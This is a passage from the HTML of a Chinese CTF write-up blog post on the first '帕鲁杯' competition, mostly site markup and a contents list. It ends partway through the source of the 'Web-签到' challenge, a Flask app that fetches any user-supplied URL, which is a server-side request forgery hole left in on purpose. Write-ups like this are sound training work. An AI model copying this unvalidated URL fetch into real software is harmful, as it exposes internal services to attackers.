@@ -1,0 +1,802 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="ta0"><meta name="copyright" content="ta0"><meta name="generator" content="Hexo 7.1.1"><meta name="theme" content="hexo-theme-yun"><title>第一届&quot;帕鲁杯&quot;wp | ta0的小站</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/star-markdown-css@0.4.1/dist/yun/yun-markdown.min.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/prism-theme-vars/base.css"><script src="https://fastly.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
+  [".post-card",".markdown-body img"].forEach((target)=> {
+    ScrollReveal().reveal(target);
+  })
+}
+document.addEventListener("DOMContentLoaded", initScrollReveal);
+document.addEventListener("pjax:success", initScrollReveal);
+</script><link rel="icon" type="image/png" href="/myfa.ico"><link rel="mask-icon" href="/myfa.ico" color="#0078E7"><link rel="preload" href="/css/mycss.css" as="style"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="preconnect" href="https://fastly.jsdelivr.net/npm/" crossorigin><script id="yun-config">
+    window.Yun = {}
+    window.CONFIG = {"hostname":"tao0845.github.io","root":"/","title":"做点小小记录","version":"1.10.11","mode":"time","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"搜索...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）"},"anonymous_image":"https://cdn.yunyoujun.cn/img/avatar/none.jpg","say":{"api":"https://el-bot-api.vercel.app/api/words/young"},"local_search":{"path":"/search.xml"},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"fireworks":{"colors":null},"vendors":{"host":"https://fastly.jsdelivr.net/npm/","darken":"https://fastly.jsdelivr.net/npm/darken@1.5.0"}};
+  </script><link rel="stylesheet" href="/css/mycss.css"><script src="/js/hexo-theme-yun.js" type="module"></script><meta name="description" content="刚刚玩完第一届帕鲁杯，跟几位师傅一起打的比赛，个人也是第一次参加应急响应的比赛，感觉挺有意思，记录一下.(以下wp包含复现内容)先是几道ctf题 WEBWeb-签到from flask import Flask, request, jsonify import requests from flag import flag  # 假设从 flag.py 文件中导入了 flag 函数 app &#x3D; Fl">
+<meta property="og:type" content="article">
+<meta property="og:title" content="第一届&quot;帕鲁杯&quot;wp">
+<meta property="og:url" content="https://tao0845.github.io/posts/f79382a3/index.html">
+<meta property="og:site_name" content="ta0的小站">
+<meta property="og:description" content="刚刚玩完第一届帕鲁杯，跟几位师傅一起打的比赛，个人也是第一次参加应急响应的比赛，感觉挺有意思，记录一下.(以下wp包含复现内容)先是几道ctf题 WEBWeb-签到from flask import Flask, request, jsonify import requests from flag import flag  # 假设从 flag.py 文件中导入了 flag 函数 app &#x3D; Fl">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://ooo.0x0.ooo/2024/04/22/Op1eAt.png">
+<meta property="og:image" content="https://ooo.0x0.ooo/2024/04/22/Op1rSx.png">
+<meta property="og:image" content="https://ooo.0x0.ooo/2024/04/22/OpNAtU.png">
+<meta property="og:image" content="https://ooo.0x0.ooo/2024/04/22/OpNKjY.png">
+<meta property="og:image" content="https://ooo.0x0.ooo/2024/04/22/OpNvWv.png">
+<meta property="og:image" content="https://ooo.0x0.ooo/2024/04/22/OpNygq.png">
+<meta property="og:image" content="https://ooo.0x0.ooo/2024/04/22/OpNgsc.png">
+<meta property="og:image" content="https://ooo.0x0.ooo/2024/04/22/OpNPGG.png">
+<meta property="og:image" content="https://ooo.0x0.ooo/2024/04/22/OpN4hI.jpg">
+<meta property="og:image" content="https://ooo.0x0.ooo/2024/04/22/OpNH2F.png">
+<meta property="og:image" content="https://ooo.0x0.ooo/2024/04/22/OpNEW6.png">
+<meta property="og:image" content="https://ooo.0x0.ooo/2024/04/22/OpNGgP.png">
+<meta property="og:image" content="https://ooo.0x0.ooo/2024/04/22/OpNQVb.png">
+<meta property="og:image" content="https://ooo.0x0.ooo/2024/04/22/OpN0ol.png">
+<meta property="og:image" content="https://ooo.0x0.ooo/2024/04/22/OpNcrg.png">
+<meta property="og:image" content="https://ooo.0x0.ooo/2024/04/22/OpNs3s.png">
+<meta property="og:image" content="https://ooo.0x0.ooo/2024/04/22/OpNYiK.png">
+<meta property="og:image" content="https://ooo.0x0.ooo/2024/04/23/Opyppj.png">
+<meta property="og:image" content="https://ooo.0x0.ooo/2024/04/23/OpytKY.png">
+<meta property="og:image" content="https://ooo.0x0.ooo/2024/04/23/Opy40v.png">
+<meta property="og:image" content="https://ooo.0x0.ooo/2024/04/23/OpyHMq.png">
+<meta property="og:image" content="https://ooo.0x0.ooo/2024/04/23/OpyL1c.png">
+<meta property="og:image" content="https://ooo.0x0.ooo/2024/04/23/OpyEHr.png">
+<meta property="og:image" content="https://ooo.0x0.ooo/2024/04/23/OpySxG.png">
+<meta property="og:image" content="https://ooo.0x0.ooo/2024/04/23/Opy0J1.png">
+<meta property="og:image" content="https://ooo.0x0.ooo/2024/04/23/OpycfI.png">
+<meta property="og:image" content="https://ooo.0x0.ooo/2024/04/22/OpN6VL.png">
+<meta property="og:image" content="https://ooo.0x0.ooo/2024/04/22/OpNXqi.png">
+<meta property="og:image" content="https://ooo.0x0.ooo/2024/04/22/OpNurX.png">
+<meta property="og:image" content="https://ooo.0x0.ooo/2024/04/22/OpNwij.png">
+<meta property="og:image" content="https://ooo.0x0.ooo/2024/04/22/OpN3Cx.png">
+<meta property="og:image" content="https://ooo.0x0.ooo/2024/04/22/OpNwij.png">
+<meta property="og:image" content="https://ooo.0x0.ooo/2024/04/22/OpeM4p.png">
+<meta property="og:image" content="https://ooo.0x0.ooo/2024/04/22/OpeO6U.png">
+<meta property="og:image" content="https://ooo.0x0.ooo/2024/04/22/OpeobY.png">
+<meta property="og:image" content="https://ooo.0x0.ooo/2024/04/22/Ope5Yq.png">
+<meta property="og:image" content="https://ooo.0x0.ooo/2024/04/22/OpeTqc.png">
+<meta property="og:image" content="https://ooo.0x0.ooo/2024/04/22/OpeUAr.png">
+<meta property="og:image" content="https://ooo.0x0.ooo/2024/04/22/OpeWSM.png">
+<meta property="og:image" content="https://ooo.0x0.ooo/2024/04/22/OpebCG.png">
+<meta property="og:image" content="https://ooo.0x0.ooo/2024/04/22/Opexn1.png">
+<meta property="og:image" content="https://ooo.0x0.ooo/2024/04/22/Opez4I.png">
+<meta property="og:image" content="https://ooo.0x0.ooo/2024/04/22/OpeF6D.png">
+<meta property="og:image" content="https://ooo.0x0.ooo/2024/04/22/OpeikF.png">
+<meta property="og:image" content="https://ooo.0x0.ooo/2024/04/22/Openm6.webp">
+<meta property="og:image" content="https://ooo.0x0.ooo/2024/04/23/OpKF6j.png">
+<meta property="og:image" content="https://ooo.0x0.ooo/2024/04/23/OpKikp.png">
+<meta property="og:image" content="https://ooo.0x0.ooo/2024/04/23/OpKnpU.png">
+<meta property="og:image" content="https://ooo.0x0.ooo/2024/04/23/OpK1YY.png">
+<meta property="og:image" content="https://ooo.0x0.ooo/2024/04/23/OpKN5v.png">
+<meta property="og:image" content="https://ooo.0x0.ooo/2024/04/23/OpKeKq.webp">
+<meta property="og:image" content="https://ooo.0x0.ooo/2024/04/23/OpKrSc.webp">
+<meta property="og:image" content="https://ooo.0x0.ooo/2024/04/23/OpKAwr.png">
+<meta property="og:image" content="https://ooo.0x0.ooo/2024/04/23/OpKZ1M.png">
+<meta property="og:image" content="https://ooo.0x0.ooo/2024/04/23/OpKvDG.png">
+<meta property="og:image" content="https://ooo.0x0.ooo/2024/04/23/OpKy81.png">
+<meta property="og:image" content="https://ooo.0x0.ooo/2024/04/23/OpKmkI.png">
+<meta property="og:image" content="https://ooo.0x0.ooo/2024/04/23/OpKppD.png">
+<meta property="og:image" content="https://ooo.0x0.ooo/2024/04/23/OpKR56.png">
+<meta property="og:image" content="https://ooo.0x0.ooo/2024/04/23/OpKJfF.png">
+<meta property="og:image" content="https://ooo.0x0.ooo/2024/04/23/OpKtKP.webp">
+<meta property="og:image" content="https://ooo.0x0.ooo/2024/04/23/OpK40b.png">
+<meta property="og:image" content="https://ooo.0x0.ooo/2024/04/23/OpKDwl.webp">
+<meta property="og:image" content="https://ooo.0x0.ooo/2024/04/23/OpKEHB.webp">
+<meta property="og:image" content="https://ooo.0x0.ooo/2024/04/23/OpKL1g.webp">
+<meta property="article:published_time" content="2024-04-22T05:16:35.160Z">
+<meta property="article:modified_time" content="2024-06-07T05:26:52.632Z">
+<meta property="article:author" content="ta0">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ooo.0x0.ooo/2024/04/22/Op1eAt.png"><script>(function() {
+  if (CONFIG.mode !== 'auto') return
+  const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
+  const setting = localStorage.getItem('darken-mode') || 'auto'
+  if (setting === 'dark' || (prefersDark && setting !== 'light'))
+    document.documentElement.classList.toggle('dark', true)
+})()</script></head><body><script src="https://code.iconify.design/2/2.1.1/iconify.min.js"></script><script>// Define global variable
+IconifyProviders = {
+  // Empty prefix: overwrite default API provider configuration
+  '': {
+    // Use custom API first, use Iconify public API as backup
+    resources: [
+        'https://api.iconify.design',
+    ],
+    // Wait for 1 second before switching API hosts
+    rotate: 1000,
+  },
+};</script><script defer src="https://fastly.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js" type="module"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js" type="module"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="文章目录"><span class="icon iconify" data-icon="ri:list-ordered"></span></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="站点概览"><span class="icon iconify" data-icon="ri:passport-line"></span></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="ta0"><img width="96" loading="lazy" src="/123.jpg" alt="ta0"></a><div class="site-author-name"><a href="/about/">ta0</a></div><span class="site-name">ta0的小站</span><sub class="site-subtitle">网安小白的成长记录</sub><div class="site-description">Learning For Fun</div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="首页"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:home-4-line"></span></span></a><div class="site-state-item"><a href="/archives/" title="归档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:archive-line"></span></span><span class="site-state-item-count">69</span></a></div><div class="site-state-item"><a href="/categories/" title="分类"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:folder-2-line"></span></span><span class="site-state-item-count">11</span></a></div><div class="site-state-item"><a href="/tags/" title="标签"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="site-state-item-count">107</span></a></div><a class="site-state-item hty-icon-button" target="_blank" rel="noopener" href="https://yun.yunyoujun.cn" title="文档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:settings-line"></span></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/tao0845" title="GitHub" target="_blank" style="color:#6e5494"><span class="icon iconify" data-icon="ri:github-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://music.163.com/#/user/home?id=312924699" title="网易云音乐" target="_blank" style="color:#C20C0C"><span class="icon iconify" data-icon="ri:netease-cloud-music-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="mailto:2814928906@qq.com" title="E-Mail" target="_blank" style="color:#8E71C1"><span class="icon iconify" data-icon="ri:mail-line"></span></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="我的小伙伴们" style="color:dodgerblue"><span class="icon iconify" data-icon="ri:genderless-line"></span></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><span class="icon iconify" data-icon="ri:contrast-2-line"></span></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#WEB"><span class="toc-number">1.</span> <span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-%E7%AD%BE%E5%88%B0"><span class="toc-number">1.1.</span> <span class="toc-text">Web-签到</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#R23"><span class="toc-number">1.2.</span> <span class="toc-text">R23</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%87%E5%AE%99%E5%8F%AC%E5%94%A4"><span class="toc-number">1.3.</span> <span class="toc-text">宇宙召唤</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MISC"><span class="toc-number">2.</span> <span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc-%E7%AD%BE%E5%88%B0"><span class="toc-number">2.1.</span> <span class="toc-text">Misc-签到</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B1%9F"><span class="toc-number">2.2.</span> <span class="toc-text">江</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FM145-8"><span class="toc-number">2.3.</span> <span class="toc-text">FM145.8</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-misc"><span class="toc-number">2.4.</span> <span class="toc-text">ez_misc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E6%88%91%E7%9A%84%E6%96%B0%E7%8C%AB%E7%8C%AB%E5%90%83%E4%B8%8D%E9%A5%B1"><span class="toc-number">2.5.</span> <span class="toc-text">为什么我的新猫猫吃不饱</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#350-350"><span class="toc-number">2.6.</span> <span class="toc-text">350*350</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Crypto"><span class="toc-number">3.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%9B%E5%8D%A1%E5%B7%B4%E5%8D%A1%E6%9C%89%E4%BB%80%E4%B9%88%E5%9D%8F%E5%BF%83%E6%80%9D%E5%91%A2"><span class="toc-number">3.1.</span> <span class="toc-text">玛卡巴卡有什么坏心思呢</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94"><span class="toc-number">4.</span> <span class="toc-text">应急响应</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-1"><span class="toc-number">4.0.1.</span> <span class="toc-text">应急响应-1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-2"><span class="toc-number">4.0.2.</span> <span class="toc-text">应急响应-2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-3"><span class="toc-number">4.0.3.</span> <span class="toc-text">应急响应-3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-4"><span class="toc-number">4.0.4.</span> <span class="toc-text">应急响应-4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-5"><span class="toc-number">4.0.5.</span> <span class="toc-text">应急响应-5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-6"><span class="toc-number">4.0.6.</span> <span class="toc-text">应急响应-6</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-7"><span class="toc-number">4.0.7.</span> <span class="toc-text">应急响应-7</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-8"><span class="toc-number">4.0.8.</span> <span class="toc-text">应急响应-8</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-9"><span class="toc-number">4.0.9.</span> <span class="toc-text">应急响应-9</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-10"><span class="toc-number">4.0.10.</span> <span class="toc-text">应急响应-10</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-11"><span class="toc-number">4.0.11.</span> <span class="toc-text">应急响应-11</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-12"><span class="toc-number">4.0.12.</span> <span class="toc-text">应急响应-12</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-13"><span class="toc-number">4.0.13.</span> <span class="toc-text">应急响应-13</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-14"><span class="toc-number">4.0.14.</span> <span class="toc-text">应急响应-14</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-15"><span class="toc-number">4.0.15.</span> <span class="toc-text">应急响应-15</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-16"><span class="toc-number">4.0.16.</span> <span class="toc-text">应急响应-16</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-17"><span class="toc-number">4.0.17.</span> <span class="toc-text">应急响应-17</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-18"><span class="toc-number">4.0.18.</span> <span class="toc-text">应急响应-18</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-19"><span class="toc-number">4.0.19.</span> <span class="toc-text">应急响应-19</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-20"><span class="toc-number">4.0.20.</span> <span class="toc-text">应急响应-20</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-21"><span class="toc-number">4.0.21.</span> <span class="toc-text">应急响应-21</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-22"><span class="toc-number">4.0.22.</span> <span class="toc-text">应急响应-22</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-23"><span class="toc-number">4.0.23.</span> <span class="toc-text">应急响应-23</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-24"><span class="toc-number">4.0.24.</span> <span class="toc-text">应急响应-24</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-25"><span class="toc-number">4.0.25.</span> <span class="toc-text">应急响应-25</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-26"><span class="toc-number">4.0.26.</span> <span class="toc-text">应急响应-26</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-27"><span class="toc-number">4.0.27.</span> <span class="toc-text">应急响应-27</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-28"><span class="toc-number">4.0.28.</span> <span class="toc-text">应急响应-28</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-29"><span class="toc-number">4.0.29.</span> <span class="toc-text">应急响应-29</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-30"><span class="toc-number">4.0.30.</span> <span class="toc-text">应急响应-30</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-31"><span class="toc-number">4.0.31.</span> <span class="toc-text">应急响应-31</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-32"><span class="toc-number">4.0.32.</span> <span class="toc-text">应急响应-32</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-33"><span class="toc-number">4.0.33.</span> <span class="toc-text">应急响应-33</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-34"><span class="toc-number">4.0.34.</span> <span class="toc-text">应急响应-34</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-35"><span class="toc-number">4.0.35.</span> <span class="toc-text">应急响应-35</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-36"><span class="toc-number">4.0.36.</span> <span class="toc-text">应急响应-36</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-37"><span class="toc-number">4.0.37.</span> <span class="toc-text">应急响应-37</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-38"><span class="toc-number">4.0.38.</span> <span class="toc-text">应急响应-38</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-39"><span class="toc-number">4.0.39.</span> <span class="toc-text">应急响应-39</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-40"><span class="toc-number">4.0.40.</span> <span class="toc-text">应急响应-40</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-41"><span class="toc-number">4.0.41.</span> <span class="toc-text">应急响应-41</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-42"><span class="toc-number">4.0.42.</span> <span class="toc-text">应急响应-42</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-43"><span class="toc-number">4.0.43.</span> <span class="toc-text">应急响应-43</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-44"><span class="toc-number">4.0.44.</span> <span class="toc-text">应急响应-44</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-45"><span class="toc-number">4.0.45.</span> <span class="toc-text">应急响应-45</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-46"><span class="toc-number">4.0.46.</span> <span class="toc-text">应急响应-46</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-47"><span class="toc-number">4.0.47.</span> <span class="toc-text">应急响应-47</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-48-51"><span class="toc-number">4.0.48.</span> <span class="toc-text">应急响应-48-51</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-52"><span class="toc-number">4.0.49.</span> <span class="toc-text">应急响应-52</span></a></li></ol></li></ol></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article" style="--smc-primary:#0078E7;"><link itemprop="mainEntityOfPage" href="https://tao0845.github.io/posts/f79382a3/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="ta0"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="ta0的小站"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">第一届&quot;帕鲁杯&quot;wp</h1><div class="post-meta"><div class="post-time" style="display:block"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-line"></span></span> <time title="创建时间：2024-04-22 13:16:35" itemprop="dateCreated datePublished" datetime="2024-04-22T13:16:35+08:00">2024-04-22</time><span class="post-meta-divider">-</span><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-2-line"></span></span> <time title="修改时间：2024-06-07 13:26:52" itemprop="dateModified" datetime="2024-06-07T13:26:52+08:00">2024-06-07</time></div><span class="post-count"><span class="post-symbolcount"><span class="post-meta-item-icon" title="本文字数"><span class="icon iconify" data-icon="ri:file-word-line"></span></span> <span title="本文字数">4.3k</span><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读时长"><span class="icon iconify" data-icon="ri:timer-line"></span></span> <span title="阅读时长">18m</span></span></span><span class="post-busuanzi"><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读次数"><span class="icon iconify" data-icon="ri:eye-line"></span> <span id="busuanzi_value_page_pv"></span></span></span><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><span class="icon iconify" data-icon="ri:folder-line"></span></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">应急响应</span></a></span></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body"><p>刚刚玩完第一届帕鲁杯，跟几位师傅一起打的比赛，个人也是第一次参加应急响应的比赛，感觉挺有意思，记录一下.(以下wp包含复现内容)<br>先是几道ctf题</p>
+<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="Web-签到"><a href="#Web-签到" class="headerlink" title="Web-签到"></a>Web-签到</h2><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> jsonify
+<span class="token keyword">import</span> requests
+<span class="token keyword">from</span> flag <span class="token keyword">import</span> flag  <span class="token comment"># 假设从 flag.py 文件中导入了 flag 函数</span>
+app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">getinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    url <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'url'</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> url<span class="token punctuation">:</span>
+        <span class="token comment"># 请求url</span>
+        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
+        content <span class="token operator">=</span> response<span class="token punctuation">.</span>text
+        <span class="token keyword">print</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span>
+        <span class="token keyword">if</span> <span class="token string">"paluctf"</span> <span class="token keyword">in</span> content<span class="token punctuation">:</span>
+            <span class="token keyword">return</span> flag
+        <span class="token keyword">else</span><span class="token punctuation">:</span>
+            <span class="token keyword">return</span> content
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        response <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+            <span class="token string">'message'</span><span class="token punctuation">:</span> <span class="token number">200</span><span class="token punctuation">,</span>  <span class="token comment"># 这里是数值，不是字符串</span>
+            <span class="token string">'data'</span><span class="token punctuation">:</span> <span class="token string">"Come sign in and get the flag!"</span>
+        <span class="token punctuation">&#125;</span>
